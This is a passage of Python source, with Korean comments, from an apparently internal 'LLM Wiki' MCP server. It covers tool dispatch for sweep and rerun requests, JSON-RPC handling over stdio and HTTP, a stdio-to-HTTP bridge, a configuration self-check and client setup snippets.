            out["structuredContent"] = {"count": len(brief), "total": total, "statuses": list(_led.STATUSES),
                                        "ledger_health": _led.health()}
            return out
        rid = int(args.get("request_id") or 0)
        if rid:
            r = pipe.store.get_request(rid, archive_dir=pipe.s.requests_archive_dir())
            if not r:
                return _err("request %s 를 찾을 수 없습니다 (보존 기간이 지났을 수 있습니다)" % rid)
            res = r.get("result") or {}
            body = {"id": r.get("id"), "ts": r.get("ts"), "kind": r.get("kind"), "ms": r.get("ms"),
                    "query": res.get("query") or r.get("summary"), "answer": res.get("answer"),
                    "verdict": (res.get("evidence") or {}).get("verdict"), "groundedness": res.get("groundedness"),
                    "cited": res.get("cited"), "hits": res.get("hits_brief")}
            out = _text(json.dumps(body, ensure_ascii=False, indent=1, default=str))
            out["structuredContent"] = {k: body[k] for k in ("id", "kind", "ms", "verdict", "groundedness")}
            return out
        rows = pipe.store.requests(kind=str(args.get("kind") or "") or None,
                                   limit=max(1, min(int(args.get("limit") or 20), 100)),
                                   q=str(args.get("q") or "") or None)
        brief = [{"id": r["id"], "ts": r["ts"], "kind": r["kind"], "ms": r["ms"], "summary": r["summary"]} for r in rows]
        out = _text(json.dumps(brief, ensure_ascii=False, indent=1, default=str))
        out["structuredContent"] = {"count": len(brief)}
        return out
    if name == "wiki_sweep":
        from . import sweep as _sw
        from . import rerun as _rr
        key = str(args.get("key") or "").strip()
        if not key:
            # 키 없이 부르면 **무엇을 스윕할 수 있는지** 알려 준다 (wiki_rerun 의 인자 없는 호출과 같은 관례)
            keys = [{k: d.get(k) for k in ("key", "kind", "type", "min", "max", "choices", "default", "point")} for d in _sw.sweepable_keys(pipe.s)]
            body = {"keys": keys, "points": [{k: p[k] for k in ("id", "label")} for p in _rr.POINTS], "saved": _rr.list_saved(pipe.s, 10),
                    "max_values": int(getattr(pipe.s, "sweep_max_values", 20) or 20),
                    "how": "key 와 values(또는 range) 를 주고 다시 부르세요. request_id 를 생략하면 마지막 저장 요청이 기준입니다."}
            out = _text(json.dumps(body, ensure_ascii=False, indent=1, default=str))
            out["structuredContent"] = {"n_keys": len(keys), "max_values": body["max_values"]}
            return out
        rid = args.get("request_id")
        rid = None if rid in (None, "", "last") else rid
        try:
            spec = {"range": args["range"]} if args.get("range") else ({"values": args["values"]} if args.get("values") is not None else None)
            vals = _sw.resolve_values(key, spec, int(getattr(pipe.s, "sweep_max_values", 20) or 20))
            rec = _sw.run(pipe, rid if rid is not None else "last", key, vals, repeats=int(args.get("repeats") or 1),
                          from_point=str(args.get("from") or "") or None, log=False)
        except ValueError as e:
            return _err(str(e))
        cmp_ = _sw.compare(rec)
        out = _text(_sw.render_text(rec, cmp_))
        out["structuredContent"] = {"record": _sw.brief(rec, 2000), "compare": cmp_}
        return out
    if name == "wiki_rerun":
        from . import rerun as _rr
        rid = int(args.get("request_id") or 0)
        if not rid:
            # 인자 없이 부르면 **어디서부터 다시 돌릴 수 있는지** 알려 준다 (붙는 LLM 이 목록을 먼저 본다)
            return _text(json.dumps({"points": [{k: p[k] for k in ("id", "label", "note")} for p in _rr.POINTS],
                                     "saved": _rr.list_saved(pipe.s, 20),
                                     "how": "request_id 와 from 을 주고 다시 부르세요. overrides 로 이번 실행에만 설정을 바꿀 수 있습니다."},
                                    ensure_ascii=False, indent=1, default=str))
        point = str(args.get("from") or "answer_llm")
        ov = safe_overrides(pipe, args.get("overrides") if isinstance(args.get("overrides"), dict) else None)
        try:
            with pipe.request_scope(overrides=ov or None):
                res, tr = pipe.rerun(rid, point, log=True)
        except ValueError as e:
            return _err(str(e))
        replayed = []

        def _walk(n):
            if n.get("replayed"):
                replayed.append(n.get("name"))
            for c in n.get("children") or []:
                _walk(c)
        _walk(tr or {})
        body = {"rerun_of": rid, "from": point, "replayed_stages": replayed, "request_id": res.get("request_id"),
                "ms": res.get("ms"), "answer": res.get("answer"), "answer_mode": res.get("answer_mode"),
                "verdict": (res.get("evidence") or {}).get("verdict"), "groundedness": res.get("groundedness")}
        out = _text(json.dumps(body, ensure_ascii=False, indent=1, default=str))
        out["structuredContent"] = {k: body[k] for k in ("rerun_of", "from", "request_id", "ms", "verdict")}
        return out
    return _err("unknown tool %s — 사용 가능: %s" % (name, ", ".join(t["name"] for t in list_tools(pipe, federate=federate))))


def handle(pipe, msg: Dict[str, Any], federate: bool = True) -> Optional[Dict[str, Any]]:
    """JSON-RPC 메시지 하나 → 응답(알림이면 None). stdio·HTTP 공용. federate=False 는 페더레이션 하위 호출(재귀 방지)."""
    mid = msg.get("id")
    method = msg.get("method")
    params = msg.get("params") or {}
    if not isinstance(method, str) or not method:
        # method 가 없으면 요청도 알림도 아니다 (JSON-RPC Invalid Request). 조용히 버리면 클라이언트가
        # 응답을 기다리며 멈춘다 — id 가 없어도 id:null 로 오류를 돌려줘 붙는 쪽이 원인을 본다.
        return {"jsonrpc": "2.0", "id": mid, "error": {"code": -32600, "message": "invalid request: 'method' 가 없습니다"}}
    if method == "initialize":
        want = str(params.get("protocolVersion") or "")
        # 우리가 지원하는 버전이면 그대로, 아니면 우리 최신을 돌려준다 (클라이언트가 계속할지 판단한다 — 스펙 권고)
        agreed = want if want in SUPPORTED_PROTOCOLS else PROTOCOL_VERSION
        return {"jsonrpc": "2.0", "id": mid, "result": {"protocolVersion": agreed,
                                                        "capabilities": {"tools": {"listChanged": False}},
                                                        "serverInfo": SERVER_INFO,
                                                        "instructions": "사내 LLM Wiki. wiki_query 로 질문(인용 [C#] 포함 답변) → 결과가 부족하면 wiki_forensic(request_id, expected_docs/terms) 로 원인 분석, wiki_feedback 으로 피드백, wiki_propose 로 제안."}}
    if method in ("notifications/initialized", "initialized"):
        return None
    if method == "ping":
        return {"jsonrpc": "2.0", "id": mid, "result": {}}
    if method == "tools/list":
        return {"jsonrpc": "2.0", "id": mid, "result": {"tools": list_tools(pipe, federate=federate)}}
    if method == "tools/call":
        try:
            res = call_tool(pipe, params.get("name", ""), params.get("arguments") or {}, federate=federate)
        except AuthError as e:
            # 권한 거부(예: overrides 화이트리스트)는 **왜 거부됐는지**를 그대로 돌려준다 — 붙은 LLM 이
            # 인자를 고쳐 다시 부를 수 있어야 한다 (validate_args 의 오류 메시지와 같은 관례).
            res = {"content": [{"type": "text", "text": "권한 거부(%d): %s" % (e.status, e.error)}], "isError": True}
        except Exception as e:  # 도구 오류는 isError 로
            res = {"content": [{"type": "text", "text": "error: %s" % e}], "isError": True}
        return {"jsonrpc": "2.0", "id": mid, "result": res}
    # capabilities 에 선언하지 않았지만 그냥 부르는 클라이언트가 있다 — 빈 목록으로 답해 준다 (오류로 멈추지 않게)
    if method == "resources/list":
        return {"jsonrpc": "2.0", "id": mid, "result": {"resources": []}}
    if method == "resources/templates/list":
        return {"jsonrpc": "2.0", "id": mid, "result": {"resourceTemplates": []}}
    if method == "prompts/list":
        return {"jsonrpc": "2.0", "id": mid, "result": {"prompts": []}}
    if method == "logging/setLevel":
        return {"jsonrpc": "2.0", "id": mid, "result": {}}
    if mid is None:
        return None
    return {"jsonrpc": "2.0", "id": mid, "error": {"code": -32601, "message": "method not found: %s" % method}}


# ---------------------------------------------------------------- stdio
def _read_message(stream) -> Optional[Dict[str, Any]]:
    """Content-Length 프레이밍 또는 줄 단위 JSON 둘 다 허용."""
    line = stream.readline()
    if not line:
        return None
    if line.lower().startswith("content-length:"):
        n = int(line.split(":", 1)[1].strip())
        while True:
            l2 = stream.readline()
            if not l2 or l2.strip() == "":
                break
        # Content-Length 는 **바이트** 수인데 텍스트 스트림의 read(n) 은 **문자** 수를 센다.
        # 한글이 든 본문은 바이트 > 문자이므로 read(n) 은 다음 메시지까지 삼켜 버린다
        # (반대로 바이트를 문자로 착각해 모자라게 읽으면 남은 조각이 다음 메시지에 붙는다).
        # 그래서 인코딩한 길이를 세며 필요한 만큼만 모은다. 요청 본문은 작아 한 글자씩 읽어도 부담이 없다.
        buf: List[str] = []
        got = 0
        while got < n:
            ch = stream.read(1)
            if not ch:
                break
            buf.append(ch)
            got += len(ch.encode("utf-8"))
        return json.loads("".join(buf))
    line = line.strip()
    if not line:
        return {}
    return json.loads(line)


def serve_stdio(pipe) -> None:
    inp = sys.stdin
    out = sys.stdout
    if hasattr(out, "reconfigure"):
        try:
            out.reconfigure(encoding="utf-8")
        except Exception:
            pass
    while True:
        try:
            msg = _read_message(inp)
        except Exception as e:
            sys.stderr.write("mcp parse error: %s\n" % e)
            continue
        if msg is None:
            break
        if not msg:
            continue
        if isinstance(msg, list):
            resps = [r for r in (handle(pipe, m) for m in msg if isinstance(m, dict)) if r is not None]
            if resps:
                out.write(json.dumps(resps, ensure_ascii=False) + "\n")
                out.flush()
            continue
        resp = handle(pipe, msg)
        if resp is not None:
            out.write(json.dumps(resp, ensure_ascii=False) + "\n")
            out.flush()


# ---------------------------------------------------------------- Streamable HTTP (JSON 응답 모드)
def _scrub_surrogates(v: Any, depth: int = 0) -> Any:
    """JSON-RPC 본문에서 UTF-8 로 인코딩할 수 없는 문자열(짝 없는 서러게이트)을 걸러 낸다."""
    if depth > 12:
        return v
    if isinstance(v, str):
        try:
            v.encode("utf-8")
            return v
        except UnicodeEncodeError:
            return v.encode("utf-8", "replace").decode("utf-8", "replace")
    if isinstance(v, dict):
        return {_scrub_surrogates(k, depth + 1): _scrub_surrogates(x, depth + 1) for k, x in v.items()}
    if isinstance(v, list):
        return [_scrub_surrogates(x, depth + 1) for x in v]
    return v


def handle_http(pipe, method: str, body: bytes, headers: Any, session_id: Optional[str] = None) -> Tuple[int, Dict[str, str], bytes]:
    """POST /mcp 본문(JSON-RPC 단건/배열) → (status, headers, body). GET → 405(SSE 스트림 미제공), DELETE → 200.
    인증·권한은 호출자(Web 서버)가 이미 끝냈다 (read 등급)."""
    if method == "GET":
        return 405, {"Allow": "POST, DELETE", "Content-Type": "application/json"}, json.dumps({"error": "SSE stream not supported; use POST (JSON responses)"}).encode("utf-8")
    if method == "DELETE":
        return 200, {"Content-Type": "application/json"}, b"{}"
    try:
        # errors="replace": JSON 은 짝 없는 서러게이트를 표현할 수 있지만 파이썬은 그것을 UTF-8 로
        # 인코딩하지 못한다. 안으로 들여보내면 SQLite 기록·응답 직렬화가 전부 실패한다.
        data = _scrub_surrogates(json.loads(body.decode("utf-8", "replace") or "null"))
    except Exception as e:
        return 400, {"Content-Type": "application/json"}, json.dumps({"jsonrpc": "2.0", "id": None, "error": {"code": -32700, "message": "parse error: %s" % e}}).encode("utf-8")
    msgs = data if isinstance(data, list) else [data]
    if not msgs or not all(isinstance(m, dict) for m in msgs):
        return 400, {"Content-Type": "application/json"}, json.dumps({"jsonrpc": "2.0", "id": None, "error": {"code": -32600, "message": "invalid request"}}).encode("utf-8")
    out_headers = {"Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store"}
    sid = (headers.get("Mcp-Session-Id") if headers is not None else None) or session_id
    federate = not bool(headers.get(FED_HEADER)) if headers is not None else True
    resps = []
    for m in msgs:
        r = handle(pipe, m, federate=federate)
        if m.get("method") == "initialize":
            out_headers["Mcp-Session-Id"] = sid or secrets.token_hex(12)
        if r is not None:
            resps.append(r)
    if sid and "Mcp-Session-Id" not in out_headers:
        out_headers["Mcp-Session-Id"] = sid
    if not resps:
        return 202, out_headers, b""      # 알림만 있었음
    payload = resps if isinstance(data, list) else resps[0]
    return 200, out_headers, json.dumps(payload, ensure_ascii=False).encode("utf-8")


# ---------------------------------------------------------------- 브리지 (stdio → 원격 HTTP)
def bridge_stdio_to_http(url: str, token: str = "", timeout: int = 600, inp=None, out=None) -> int:
    """stdin 의 JSON-RPC 를 원격 /mcp 로 POST 하고 응답을 stdout 으로. 원격이 4xx/5xx 면 JSON-RPC 오류로 되돌린다."""
    inp = inp or sys.stdin
    out = out or sys.stdout
    if hasattr(out, "reconfigure"):
        try:
            out.reconfigure(encoding="utf-8")
        except Exception:
            pass
    session: Optional[str] = None
    while True:
        try:
            msg = _read_message(inp)
        except Exception as e:
            sys.stderr.write("mcp bridge parse error: %s\n" % e)
            continue
        if msg is None:
            return 0
        if not msg:
            continue
        status, hdrs, resp_body = http_post_mcp(url, msg, token, session, timeout)
        if hdrs.get("Mcp-Session-Id"):
            session = hdrs["Mcp-Session-Id"]
        if status == 202 or not resp_body:
            continue
        if status >= 400:
            mid = msg.get("id") if isinstance(msg, dict) else None
            err = {"jsonrpc": "2.0", "id": mid, "error": {"code": -32000, "message": "remote MCP HTTP %s: %s" % (status, resp_body.decode("utf-8", "ignore")[:300])}}
            out.write(json.dumps(err, ensure_ascii=False) + "\n")
        else:
            out.write(resp_body.decode("utf-8") + "\n")
        out.flush()


def http_post_mcp(url: str, msg: Any, token: str = "", session: Optional[str] = None, timeout: int = 600,
                  headers: Optional[Dict[str, str]] = None) -> Tuple[int, Dict[str, str], bytes]:
    hdrs = {"Content-Type": "application/json", "Accept": "application/json", "X-Requested-With": "llmwiki-mcp"}
    hdrs.update(headers or {})
    if token:
        hdrs["Authorization"] = "Bearer " + token
    if session:
        hdrs["Mcp-Session-Id"] = session
    req = urllib.request.Request(url, data=json.dumps(msg, ensure_ascii=False).encode("utf-8"), headers=hdrs, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, {k: v for k, v in r.headers.items()}, r.read()
    except urllib.error.HTTPError as e:
        return e.code, {k: v for k, v in e.headers.items()}, e.read()
    except Exception as e:
        return 599, {}, str(e).encode("utf-8")


# ---------------------------------------------------------------- 자가 점검 (bring-up)
def doctor(pipe, check_sources: bool = False) -> Dict[str, Any]:
    """MCP 설정을 한 번에 점검한다 — `python -m llmwiki mcp --doctor`.

    붙이려는 LLM 이 여럿이고 외부 RAG 까지 얹는 환경에서, "무엇이 안 붙는가" 를 서버 쪽에서 먼저 답하기 위한 것.
    확인: 도구 목록과 스키마 · 플러그인 적재 · 외부 소스 선언과 연결 · 페더레이션 이름 · 인증(누가 붙을 수 있는가) · 전송 설정.
    """
    from . import mcp_client as _mc
    s = pipe.s
    checks: List[Dict[str, Any]] = []

    def add(name: str, ok: bool, detail: str, hint: str = "", warn: bool = False) -> None:
        checks.append({"check": name, "ok": bool(ok), "level": "warn" if (warn and not ok) else ("ok" if ok else "error"),
                       "detail": detail, "hint": hint})

    tools = list_tools(pipe)
    builtin = [t["name"] for t in TOOLS]
    add("도구 목록", len(tools) >= len(builtin), "%d개 (built-in %d)" % (len(tools), len(builtin)))
    bad_schema = [t["name"] for t in tools if not isinstance(t.get("inputSchema"), dict) or t["inputSchema"].get("type") != "object"]
    add("inputSchema", not bad_schema, "모든 도구가 object 스키마" if not bad_schema else "스키마 이상: %s" % bad_schema,
        "플러그인 spec 의 inputSchema 를 {\"type\":\"object\",\"properties\":{…}} 형태로 고치세요")
    no_desc = [t["name"] for t in tools if not str(t.get("description") or "").strip()]
    add("도구 설명", not no_desc, "모두 있음" if not no_desc else "설명 없음: %s" % no_desc,
        "설명이 없으면 붙는 LLM 이 그 도구를 고르지 못합니다", warn=True)

    pl = load_plugins(s, force=True)
    add("플러그인", not pl["errors"], "%s — 파일 %d개, 도구 %s" % (pl["dir"], len(pl["files"]), pl["tools"] or "없음"),
        "오류: %s" % pl["errors"] if pl["errors"] else "")

    srcs = _mc.load_sources()
    on = {k: v for k, v in srcs.items() if v.get("enabled")}
    add("외부 소스 선언", True, "%d개 선언, %d개 enabled (%s)" % (len(srcs), len(on), ", ".join(on) or "-"))
    # 형식이 잘못돼 건너뛴 소스는 질의를 막지는 않지만(일부러 그렇게 했다) 반드시 눈에 띄어야 한다 —
    # 그러지 않으면 "붙였는데 아무 일도 안 일어난다" 로 시간을 버린다.
    bad_src = _mc.source_errors()
    add("외부 소스 형식", not bad_src,
        "모두 정상" if not bad_src else "건너뛴 소스 %d개: %s" % (len(bad_src), "; ".join("%s(%s)" % (k, v[:80]) for k, v in bad_src.items())),
        "mcp_sources.json 에서 위 소스를 고치세요. retrieve/ingest/enrich 는 [{\"tool\": …}] 형태의 목록입니다")
    for name, cfg in on.items():
        tr = str(cfg.get("transport") or "stdio")
        target = cfg.get("url") or cfg.get("base_url") or " ".join(str(x) for x in (cfg.get("command") or []))
        ok = bool(target)
        add("소스 %s 설정" % name, ok, "%s → %s" % (tr, target or "(대상 없음)"),
            "transport 가 stdio 면 command, http 면 url, rest 면 base_url 이 필요합니다")
    if check_sources:
        for r in _mc.test_sources(s, list(on)):
            add("소스 %s 연결" % r["name"], r["ok"], "%s %sms tools=%s" % (r["transport"], r["ms"], r.get("tools") or r.get("error", "")),
                "`python -m llmwiki mcp-source test %s` 로 재현" % r["name"])

    retr = [n for n, c in srcs.items() if c.get("enabled") and c.get("retrieve")]
    add("검색 채널(external_rag)", not retr or bool(s.toggles.external_rag),
        "retrieve 소스 %s · 토글 external_rag=%s" % (retr or "없음", s.toggles.external_rag),
        "retrieve 매핑이 있는데 토글이 꺼져 있으면 질의에 섞이지 않습니다 (`config set toggles.external_rag=true`)", warn=True)

    exposed = [n for n, c in srcs.items() if c.get("enabled") and c.get("expose")]
    fed = federated_tools(s, refresh=True) if s.toggles.mcp_federation else []
    fed_err = {k: v.get("error") for k, v in _FED_CACHE.items() if isinstance(v, dict) and v.get("error")}
    add("페더레이션", not exposed or bool(s.toggles.mcp_federation),
        "expose 소스 %s · 토글 mcp_federation=%s · 중계 도구 %s" % (exposed or "없음", s.toggles.mcp_federation, [t["name"] for t in fed] or "없음"),
        "expose 가 선언됐는데 토글이 꺼져 있으면 tools/list 에 나오지 않습니다", warn=True)
    add("페더레이션 연결", not fed_err, "오류 없음" if not fed_err else json.dumps(fed_err, ensure_ascii=False),
        "소스가 살아 있는지 `mcp-source test <name>` 로 확인하세요")
    add("재귀 방지", True, "이 프로세스는 %s" % ("최상위 (페더레이션 가능)" if federation_allowed() else "페더레이션 하위 (자기 페더레이션 안 함)"))

    try:
        from . import auth as _auth
        sec = _auth.load_security()
        anon = sec.get("anonymous_role") or ""
        nkeys = len(sec.get("api_keys") or [])
        add("인증", bool(anon or nkeys or sec.get("users")),
            "anonymous_role=%s · API 키 %d개 · 계정 %d개" % (anon or "(없음)", nkeys, len(sec.get("users") or [])),
            "원격 LLM 은 Authorization: Bearer <API 키> 로 붙습니다 — `python -m llmwiki apikey add <이름> --role class2`")
        if not anon and not nkeys:
            add("원격 접속 수단", False, "익명 역할도 API 키도 없음 — HTTP 로는 아무도 붙을 수 없습니다",
                "`apikey add` 로 키를 만들거나 security.json 의 anonymous_role 을 정하세요", warn=True)
    except Exception as e:
        add("인증", False, "security 설정을 읽지 못함: %s" % e, "", warn=True)

    add("전송", True, "stdio: `python -m llmwiki mcp` · http: serve 의 POST /mcp (mcp_host=%s mcp_port=%s) · 브리지: mcp --connect <url>"
        % (getattr(s, "mcp_host", "-"), getattr(s, "mcp_port", "-")))

    errors = [c for c in checks if c["level"] == "error"]
    warns = [c for c in checks if c["level"] == "warn"]
    return {"ok": not errors, "errors": len(errors), "warnings": len(warns), "checks": checks,
            "tools": [t["name"] for t in tools], "protocol": PROTOCOL_VERSION, "supported_protocols": list(SUPPORTED_PROTOCOLS)}


def client_config_snippets(base_url: str, token: str = "") -> Dict[str, Any]:
    """문서/Web 보안 탭용: 대표 클라이언트 설정 예시."""
    py = sys.executable   # dict 를 json.dumps 하면 역슬래시는 자동 이스케이프된다 (수동 이중 이스케이프 금지)
    root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    mcp_url = base_url.rstrip("/") + ("" if base_url.rstrip("/").endswith("/mcp") else "/mcp")
    return {
        "_how": "stdio_json: 같은 PC 클라이언트(mcp.json/claude_desktop_config.json) · http_json: 원격/다수(serve 의 POST /mcp, API 키) · bridge_json: stdio 전용 클라이언트→원격 · 상세 docs/MCP.md, 예시 setup/mcp_clients.example.json",
        "stdio_claude_code": "claude mcp add llmwiki -- \"%s\" -m llmwiki mcp   (cwd=%s)" % (py, root),
        "stdio_json": {"mcpServers": {"llmwiki": {"command": py, "args": ["-m", "llmwiki", "mcp"], "cwd": root, "env": {"PYTHONIOENCODING": "utf-8"}}}},
        "http_claude_code": "claude mcp add --transport http llmwiki %s --header \"Authorization: Bearer %s\"" % (mcp_url, token or "<API_KEY>"),
        "http_json": {"mcpServers": {"llmwiki": {"type": "http", "url": mcp_url, "headers": {"Authorization": "Bearer " + (token or "<API_KEY>")}}}},
        "bridge_json": {"mcpServers": {"llmwiki-remote": {"command": py, "args": ["-m", "llmwiki", "mcp", "--connect", mcp_url, "--token", token or "<API_KEY>"], "cwd": root}}},
    }
